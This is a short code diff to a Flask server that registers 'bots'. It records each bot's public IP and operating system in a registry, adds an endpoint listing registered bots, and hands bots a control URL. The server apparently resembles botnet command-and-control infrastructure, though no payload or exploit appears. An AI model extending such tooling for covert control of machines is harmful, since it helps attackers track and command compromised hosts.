@@ -215,13 +215,19 @@ def register_bot():
     bot_id = data.get('id')
     info = data.get('info')
     public_ip = info.get('ip')
+    os_info = info.get('os')
     bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
+    save_bot_to_registry(bot_id, public_ip, os_info)
     logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
     response_payload = {'status': 'ok'}
     control_url = get_control_url()
     if control_url:
         response_payload['control_url'] = control_url
     return jsonify(response_payload)
+
+@app.route('/api/registered_bots', methods=['GET'])
+def registered_bots():
+    return jsonify(get_registered_bots())
 
 @app.route('/api/bot/ping', methods=['POST'])
 def ping():
